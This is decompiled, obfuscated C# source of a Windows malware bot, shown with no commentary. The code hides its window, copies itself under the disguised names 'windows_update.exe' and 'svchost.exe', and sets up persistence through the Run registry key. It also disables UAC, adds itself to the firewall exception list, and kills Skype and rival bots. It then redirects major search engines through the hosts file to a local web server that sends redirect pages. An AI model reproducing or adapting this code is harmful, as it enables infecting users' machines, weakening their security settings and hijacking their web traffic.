using System;
using System.CodeDom.Compiler;
using System.ComponentModel;
using System.Configuration;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.Net.Sockets;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace a
{
	internal class A
	{
		private Socket m_A;

		private byte[] m_A;

		private byte[] m_a;

		private Encoding m_A;

		private string[] m_A;

		public extern A(Socket socket_0);

		public extern void A();

		private void A(int int_0, string string_0, string string_1)
		{
			A(this.m_A, "HTTP/1.0 " + int_0 + " " + string_0 + "\r\n");
			A(this.m_A, "Content-Type: text/plain\r\n");
			A(this.m_A, "Proxy-Connection: close\r\n");
			A(this.m_A, "\r\n");
			A(this.m_A, int_0 + " " + string_0);
			A(this.m_A, string_1);
		}

		private void a(int int_0, string string_0, string string_1)
		{
			string text = "<html><script language=\"JavaScript\">window.location=\"" + string_1 + "\";</script></head></html>";
			A(this.m_A, "HTTP/1.0 200 " + string_0 + "\r\n");
			A(this.m_A, "Content-Type: text/html\r\n");
			A(this.m_A, "Content-Length: " + text.Length + "\r\n");
			A(this.m_A, "Expires: Tue, 03 Jul 2001 06:00:00 GMT\r\n");
			A(this.m_A, "Cache-Control: no-store, no-cache, must-revalidate, max-age=0\r\n");
			A(this.m_A, "Cache-Control: post-check=0, pre-check=0\r\n");
			A(this.m_A, "Pragma: no-cache\r\n");
			A(this.m_A, "\r\n");
			A(this.m_A, text);
		}

		private void B(int int_0, string string_0, string string_1)
		{
			A(this.m_A, "HTTP/1.1 302 " + string_0 + "\r\n");
			A(this.m_A, "Location: " + string_1 + "\r\n");
			A(this.m_A, "Content-Type: text/html\r\n");
			A(this.m_A, "\r\n");
		}

		private void A(Socket socket_0, string string_0)
		{
			try
			{
				this.m_a = new byte[string_0.Length + 1];
				int bytes = this.m_A.GetBytes(string_0.ToCharArray(), 0, string_0.Length, this.m_a, 0);
				socket_0.Send(this.m_a, bytes, SocketFlags.None);
			}
			catch
			{
			}
		}

		private int A(Socket socket_0, byte[] byte_0, ref string string_0)
		{
			int result = socket_0.Receive(byte_0, 10240, SocketFlags.None);
			string_0 = Encoding.ASCII.GetString(byte_0);
			return result;
		}
	}
	public class a : Form
	{
		private IContainer m_A;

		private Timer m_A;

		private RegistryKey m_A;

		private RegistryKey m_a;

		private Thread m_A;

		private bool m_A;

		private string m_A = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

		protected override void Dispose(bool disposing)
		{
			if (disposing && this.m_A != null)
			{
				this.m_A.Dispose();
			}
			((Form)this).Dispose(disposing);
		}

		private void A()
		{
			//IL_0012: Unknown result type (might be due to invalid IL or missing references)
			//IL_001c: Expected O, but got Unknown
			//IL_00bd: Unknown result type (might be due to invalid IL or missing references)
			//IL_00c7: Expected O, but got Unknown
			this.m_A = new Container();
			this.m_A = new Timer(this.m_A);
			((Control)this).SuspendLayout();
			this.m_A.set_Enabled(true);
			this.m_A.set_Interval(1000);
			this.m_A.add_Tick((EventHandler)a);
			((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
			((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
			((Form)this).set_ClientSize(new Size(115, 0));
			((Form)this).set_MaximizeBox(false);
			((Form)this).set_MinimizeBox(false);
			((Control)this).set_Name("Form1");
			((Form)this).set_Opacity(0.0);
			((Form)this).set_ShowIcon(false);
			((Form)this).set_ShowInTaskbar(false);
			((Form)this).add_FormClosed(new FormClosedEventHandler(A));
			((Form)this).add_Load((EventHandler)A);
			((Control)this).ResumeLayout(false);
		}

		public a()
		{
			A();
		}

		private void A(object sender, EventArgs e)
		{
			try
			{
				Process[] processesByName = Process.GetProcessesByName("skype");
				Process[] array = processesByName;
				foreach (Process process in array)
				{
					process.Kill();
					process.WaitForExit();
				}
				processesByName = Process.GetProcessesByName("svchost");
				Process[] array2 = processesByName;
				foreach (Process process2 in array2)
				{
					if ((process2.MainModule!.FileVersionInfo.CompanyName == "Xerox" || process2.MainModule!.FileVersionInfo.InternalName == "bot.exe") && Application.get_ExecutablePath() != this.m_A + "\\svchost.exe")
					{
						process2.Kill();
						process2.WaitForExit();
					}
				}
			}
			catch
			{
			}
			try
			{
				if (!File.Exists(Path.GetTempPath() + "windows_update.exe"))
				{
					File.Copy(Process.GetCurrentProcess().MainModule!.FileName, Path.GetTempPath() + "windows_update.exe", overwrite: true);
				}
				File.SetAttributes(Path.GetTempPath() + "windows_update.exe", File.GetAttributes(Path.GetTempPath() + "windows_update.exe") | FileAttributes.Hidden);
				Console.WriteLine("File copy OK");
			}
			catch (Exception ex)
			{
				Console.WriteLine("File copy failed : " + ex);
			}
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
				RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
				if (registryKey2 != null && registryKey2.GetValue("EnableLUA") != null)
				{
					registryKey2.SetValue("EnableLUA", "0");
				}
				Console.WriteLine("UAC desactivated");
				if (registryKey != null && registryKey.GetValue("windows_update.exe") == null)
				{
					registryKey.SetValue("windows_update.exe", Path.GetTempPath() + "windows_update.exe");
				}
				Console.WriteLine("Registry access OK and UAC desactivated");
			}
			catch (Exception ex2)
			{
				Console.WriteLine("Writing in registry failed " + ex2);
			}
			WindowsPrincipal windowsPrincipal = new WindowsPrincipal(WindowsIdentity.GetCurrent());
			bool flag = windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator);
			try
			{
				this.m_A = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
				this.m_a = Registry.LocalMachine.OpenSubKey("SYSTEM\\ControlSet001\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\AuthorizedApplications\\List", writable: true);
			}
			catch
			{
			}
			try
			{
				File.Delete(this.m_A + "\\svchost.exe");
			}
			catch
			{
			}
			if (File.Exists(this.m_A + "\\svchost.exe") && Application.get_ExecutablePath() != this.m_A + "\\svchost.exe")
			{
				((Form)this).Close();
				return;
			}
			if (!File.Exists(this.m_A + "\\svchost.exe"))
			{
				try
				{
					File.Copy(Application.get_ExecutablePath(), this.m_A + "\\svchost.exe");
					ProcessStartInfo processStartInfo = new ProcessStartInfo();
					if (!flag)
					{
						processStartInfo.Verb = "runas";
					}
					processStartInfo.FileName = this.m_A + "\\svchost.exe";
					try
					{
						Process.Start(processStartInfo);
					}
					catch (Win32Exception)
					{
					}
					((Form)this).Close();
					return;
				}
				catch
				{
					return;
				}
			}
			try
			{
				this.m_a.SetValue(Application.get_ExecutablePath(), Application.get_ExecutablePath() + ":*:Enabled:RPC");
			}
			catch
			{
			}
			try
			{
				TcpClient tcpClient = new TcpClient("127.0.0.1", 80);
				tcpClient.Close();
			}
			catch
			{
				this.m_A = new Thread(a);
				this.m_A.Start();
			}
		}

		public static byte[] A(object object_0)
		{
			int num = Marshal.SizeOf(object_0);
			IntPtr intPtr = Marshal.AllocHGlobal(num);
			Marshal.StructureToPtr(object_0, intPtr, fDeleteOld: false);
			byte[] array = new byte[num];
			Marshal.Copy(intPtr, array, 0, num);
			Marshal.FreeHGlobal(intPtr);
			return array;
		}

		public static object A(byte[] byte_0, Type type_0)
		{
			int num = Marshal.SizeOf(type_0);
			if (num > byte_0.Length)
			{
				return null;
			}
			IntPtr intPtr = Marshal.AllocHGlobal(num);
			Marshal.Copy(byte_0, 0, intPtr, num);
			object result = Marshal.PtrToStructure(intPtr, type_0);
			Marshal.FreeHGlobal(intPtr);
			return result;
		}

		private void a()
		{
			try
			{
				TcpListener tcpListener = new TcpListener(80);
				tcpListener.Start();
				this.m_A = true;
				while (true)
				{
					Socket socket_ = tcpListener.AcceptSocket();
					A @object = new A(socket_);
					Thread thread = new Thread(@object.A);
					thread.Start();
				}
			}
			catch (IOException ex)
			{
				Console.WriteLine(ex.Message);
			}
		}

		private void a(object sender, EventArgs e)
		{
			try
			{
				((Control)this).Hide();
				this.m_A.set_Enabled(false);
				this.m_A.SetValue("svchost", Application.get_ExecutablePath());
				if (this.m_A)
				{
					string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.System);
					StreamReader streamReader = File.OpenText(folderPath + "/drivers/etc/hosts");
					bool flag = true;
					bool flag2 = true;
					bool flag3 = true;
					bool flag4 = true;
					bool flag5 = true;
					while (!streamReader.EndOfStream)
					{
						string text = streamReader.ReadLine();
						if (text == "127.0.0.1 www.google.com")
						{
							flag = false;
						}
						if (text == "127.0.0.1 search.yahoo.com")
						{
							flag2 = false;
						}
						if (text == "127.0.0.1 search.msn.com")
						{
							flag3 = false;
						}
						if (text == "127.0.0.1 yandex.ru")
						{
							flag4 = false;
						}
						if (text == "127.0.0.1 bestmultisearch.com")
						{
							flag5 = false;
						}
					}
					streamReader.Close();
					if (flag || flag2 || flag3 || flag4 || flag5)
					{
						File.SetAttributes(folderPath + "/drivers/etc/hosts", FileAttributes.Normal);
						StreamWriter streamWriter = File.AppendText(folderPath + "/drivers/etc/hosts");
						streamWriter.WriteLine("");
						if (flag)
						{
							streamWriter.WriteLine("127.0.0.1 www.google.com");
						}
						if (flag2)
						{
							streamWriter.WriteLine("127.0.0.1 search.yahoo.com");
						}
						if (flag3)
						{
							streamWriter.WriteLine("127.0.0.1 search.msn.com");
						}
						if (flag4)
						{
							streamWriter.WriteLine("127.0.0.1 yandex.ru");
						}
						if (flag5)
						{
							streamWriter.WriteLine("127.0.0.1 bestmultisearch.com");
						}
						streamWriter.Close();
						File.SetAttributes(folderPath + "/drivers/etc/hosts", FileAttributes.ReadOnly | FileAttributes.Hidden);
					}
				}
				this.m_A.set_Enabled(true);
			}
			catch
			{
				this.m_A.set_Enabled(true);
			}
		}

		private void A(object sender, FormClosedEventArgs e)
		{
		}
	}
}
namespace A
{
	[GeneratedCode("System.Resources.Tools.StronglyTypedResourceBuilder", "2.0.0.0")]
	[CompilerGenerated]
	[DebuggerNonUserCode]
	internal class A
	{
		private static ResourceManager m_A;

		private static CultureInfo m_A;

		internal A()
		{
		}

		[SpecialName]
		internal static ResourceManager A()
		{
			if (global::A.A.m_A == null)
			{
				ResourceManager resourceManager = (global::A.A.m_A = new ResourceManager("bot.Properties.Resources", typeof(A).Assembly));
			}
			return global::A.A.m_A;
		}

		[SpecialName]
		internal static CultureInfo A()
		{
			return global::A.A.m_A;
		}

		[SpecialName]
		internal static void A(CultureInfo cultureInfo_0)
		{
			global::A.A.m_A = cultureInfo_0;
		}
	}
	[GeneratedCode("Microsoft.VisualStudio.Editors.SettingsDesigner.SettingsSingleFileGenerator", "8.0.0.0")]
	[CompilerGenerated]
	internal sealed class a : ApplicationSettingsBase
	{
		private static a m_A = (a)(object)SettingsBase.Synchronized((SettingsBase)(object)new a());

		[SpecialName]
		public static a A()
		{
			return a.m_A;
		}
	}
}
